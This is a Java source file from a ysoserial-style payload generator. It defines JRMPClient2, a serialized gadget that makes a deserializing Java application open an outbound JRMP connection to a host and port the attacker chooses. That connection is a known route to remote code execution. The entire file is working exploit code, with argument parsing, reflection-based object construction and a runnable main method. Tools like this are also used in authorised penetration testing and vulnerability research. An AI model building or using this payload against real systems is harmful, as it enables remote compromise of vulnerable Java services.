package cn.butler.yso.payloads;

import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.ObjID;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Random;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Reflections;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.PayloadTest;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

@SuppressWarnings ( {
    "restriction"
} )
@PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
@Authors({ Authors.MBECHLER,Authors.C0NY1 })
public class JRMPClient2 extends PayloadRunner implements ObjectPayload<UnicastRemoteObject> {
    public JRMPClient2() {
    }

    public UnicastRemoteObject getObject(String command) throws Exception {
        String host;
        int port;
        int objId;

        String[] cmds = command.split("\\:");
        if(cmds.length == 1){
            host = cmds[0];
            port = new Random().nextInt(65535);
            objId = new Random().nextInt();
        }else if(cmds.length == 2){
            host = cmds[0];
            port = Integer.valueOf(cmds[1]);
            objId = new Random().nextInt();
        }else if(cmds.length == 3){
            host = cmds[0];
            port = Integer.valueOf(cmds[1]);
            objId = Integer.valueOf(cmds[2]);
        }else{
            throw new Exception("Usage: -a host:port:obj_id");
        }

        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler myInvocationHandler = new RemoteObjectInvocationHandler(refObject);
        RMIServerSocketFactory handcraftedSSF = (RMIServerSocketFactory) Proxy.newProxyInstance(RMIServerSocketFactory.class.getClassLoader(), new Class[]{RMIServerSocketFactory.class, Remote.class}, myInvocationHandler);
        UnicastRemoteObject myRemoteObject = (UnicastRemoteObject) Reflections.newInstance(UnicastRemoteObject.class, new Class[0], new Object[0]);
        Reflections.setFieldValue(myRemoteObject, "ssf", handcraftedSSF);
        //原版,应该有问题
//        ObjID objID = new ObjID((new Random()).nextInt());
//        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
//        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
//        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
//        Activator object = (Activator)Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), new Class[]{Activator.class}, remoteObjectInvocationHandler);
        return myRemoteObject;
    }

    public static void main(String[] args) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());
        PayloadRunner.run(JRMPClient2.class, args);
    }
}
